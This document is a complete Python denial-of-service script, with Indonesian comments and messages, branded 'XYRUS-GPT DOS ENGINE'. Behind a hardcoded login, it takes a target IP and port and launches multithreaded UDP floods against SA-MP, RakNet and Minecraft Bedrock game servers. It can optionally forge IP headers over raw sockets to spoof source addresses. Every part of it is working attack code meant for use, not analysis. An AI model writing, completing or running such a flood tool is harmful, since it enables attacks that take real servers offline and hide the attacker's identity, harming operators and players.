#!/usr/bin/env python3
import socket
import random
import threading
import time
import os
import sys
import struct
from collections import deque

# ==================== AUTENTIKASI ====================
def login():
    os.system("clear" if os.name == "posix" else "cls")
    print("\033[36m" + "="*50)
    print("    XYRUS-GPT DOS ENGINE v2.0")
    print("    Authorized Personnel Only")
    print("="*50 + "\033[0m")
    user = input("Username : ")
    pw = input("Password : ")
    if user != "DAMAR" or pw != "DAMAR":
        print("\033[31m[!] Akses ditolak. Kembali ke kegelapan...\033[0m")
        sys.exit(1)
    print("\033[32m[+] Autentikasi berhasil. Memuat senjata...\033[0m")
    time.sleep(1)

login()

# ==================== KONFIGURASI ====================
target = input("Target IP       : ")
port = int(input("Target Port     : ") or 7777)
threads = int(input("Threads         : ") or 800)
duration = int(input("Duration (detik): ") or 120)
spoof = input("Spoof IP? (y/n) : ").lower() == 'y'

# Cek kemampuan raw socket
try:
    if spoof:
        s_raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s_raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        print("[+] Raw socket enabled (IP spoofing aktif)")
    else:
        s_raw = None
except PermissionError:
    print("[!] Raw socket butuh root. Spooffing dinonaktifkan.")
    spoof = False
    s_raw = None

# ==================== PAYLOAD GENERATOR ====================
def random_ip():
    return ".".join(str(random.randint(1,254)) for _ in range(4))

# SAMP Query Packet (efektif untuk memicu query handler)
def samp_query(src_ip=None):
    ip_parts = [int(x) for x in target.split('.')]
    samp_header = b'SAMP' + bytes(ip_parts) + struct.pack('<H', port) + b'i'
    if spoof and src_ip:
        # Buat IP header palsu
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                0x45, 0, 40, 0, 64, 0, 255, 0,
                                socket.inet_aton(src_ip),
                                socket.inet_aton(target))
        return ip_header + samp_header
    return samp_header

# RakNet Payload dengan variasi rekursif
raknet_variants = [
    b'\x01' + random.randbytes(30),   # Unconnected Ping
    b'\x05' + random.randbytes(30),   # Open Connection Request 1
    b'\x07' + random.randbytes(50),   # Connection Request
    b'\x00' * 128,                    # Null payload besar
    b'\xFF' * 256,                    # Flood maksimal
]

def get_raknet_payload():
    base = random.choice(raknet_variants)
    # Perbanyak dengan replikasi rekursif
    mult = random.randint(5, 20)
    payload = base * mult
    # Tambah random trailing
    payload += random.randbytes(random.randint(64, 512))
    if spoof:
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                0x45, 0, len(payload)+20, 0, 64, 0, 255, 0,
                                socket.inet_aton(random_ip()),
                                socket.inet_aton(target))
        return ip_header + payload
    return payload

# Minecraft Bedrock (RakNet) specific
def bedrock_payload():
    # RakNet Open Connection Request 1
    magic = b'\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78'
    payload = b'\x05' + magic + random.randbytes(16)
    payload += random.randbytes(random.randint(100, 500))
    if spoof:
        ip_header = struct.pack('!BBHHHBBH4s4s',
                                0x45, 0, len(payload)+20, 0, 64, 0, 255, 0,
                                socket.inet_aton(random_ip()),
                                socket.inet_aton(target))
        return ip_header + payload
    return payload

# ==================== FLOOD FUNCTIONS ====================
def samp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end = time.time() + duration
    while time.time() < end:
        try:
            if spoof and s_raw:
                src = random_ip()
                packet = samp_query(src)
                s_raw.sendto(packet, (target, 0))  # port 0 karena IP header sudah tentukan
            else:
                sock.sendto(samp_query(), (target, port))
        except:
            pass

def raknet_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end = time.time() + duration
    while time.time() < end:
        try:
            if spoof and s_raw:
                packet = get_raknet_payload()
                s_raw.sendto(packet, (target, 0))
            else:
                payload = get_raknet_payload()
                sock.sendto(payload, (target, port))
        except:
            pass

def bedrock_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    end = time.time() + duration
    while time.time() < end:
        try:
            if spoof and s_raw:
                packet = bedrock_payload()
                s_raw.sendto(packet, (target, 0))
            else:
                sock.sendto(bedrock_payload(), (target, port))
        except:
            pass

# ==================== MAIN ====================
print(f"\033[31mMenyerang {target}:{port} dengan metode:\033[0m")
print("  - SAMP Query Flood (spoofed)" if spoof else "  - SAMP Query Flood")
print("  - RakNet Payload Flood (spoofed)" if spoof else "  - RakNet Payload Flood")
if port in (19132, 19133):
    print("  - Minecraft Bedrock Specific Flood")
    flood_funcs = [samp_flood, raknet_flood, bedrock_flood]
else:
    flood_funcs = [samp_flood, raknet_flood]

# Jalankan thread
thread_pool = []
for i in range(threads):
    for func in flood_funcs:
        t = threading.Thread(target=func, daemon=True)
        t.start()
        thread_pool.append(t)
        time.sleep(0.001)  # stagger agar tidak overload CPU lokal

print(f"\n[+] Semua thread aktif. Durasi: {duration} detik. Tekan Ctrl+C untuk hentikan.\n")
try:
    time.sleep(duration + 2)
except KeyboardInterrupt:
    print("\n\033[31m[!] Dihentikan manual.\033[0m")
finally:
    print("\033[31m[+] Serangan selesai.\033[0m")
